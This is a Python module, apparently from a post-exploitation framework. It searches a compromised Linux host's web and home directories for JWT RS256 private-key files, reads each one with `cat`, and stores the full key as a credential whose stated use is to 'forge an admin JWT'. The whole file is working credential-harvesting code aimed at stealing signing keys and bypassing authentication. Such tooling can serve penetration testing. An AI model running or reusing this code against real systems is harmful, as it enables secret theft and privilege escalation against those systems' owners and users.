"""Classify RS256/PEM JWT signing keys as a jwt_sign capability (forge admin
tokens), not merely an ssh_key that reap would try to log in with. Additive — the
normal ssh_key handling elsewhere is untouched.
"""
from __future__ import annotations

import shlex

from ...models import Credential, Finding
from ..base import Module, register

_KEY_NAMES = ("jwtRS256.key", "jwtRS256.pem", "jwt.key", "jwt.pem", "private.pem",
              "rsa.key", "private.key", "jwt_private.pem", "jwtRS256.key.pub")


@register
class JwtKeys(Module):
    name = "jwt_keys"

    def triggers(self, ctx) -> bool:
        return ctx.os in ("linux", "unknown") and (
            ctx.has_runtime("node") or ctx.has_runtime("python") or ctx.has_runtime("php"))

    def collect(self, session):
        findings = []
        expr = " -o ".join(f"-name {shlex.quote(n)}" for n in _KEY_NAMES)
        cmd = (f"find /home /var/www /srv /opt /app \\( {expr} \\) "
               "-not -path '*/node_modules/*' -not -path '*/vendor/*' -size -64k "
               "2>/dev/null | head -n 20")
        for path in session.exec(cmd, timeout=45).stdout.splitlines():
            path = path.strip()
            if not path:
                continue
            content = session.exec(f"cat {shlex.quote(path)} 2>/dev/null",
                                   timeout=10).stdout
            if "PRIVATE KEY" not in content:
                continue
            findings.append(Finding(
                type="capability", severity="high",
                title=f"JWT signing key (RS256): {path}",
                detail="Forge an admin JWT (RS256) signed with this private key.",
                source_module=self.name,
                credential=Credential(
                    kind="capability", secret=content, source=path,
                    metadata={"capability": "jwt_sign", "alg": "RS256", "path": path,
                              "action": "Forge an admin JWT (RS256) signed with this "
                                        "private key."})))
        return findings
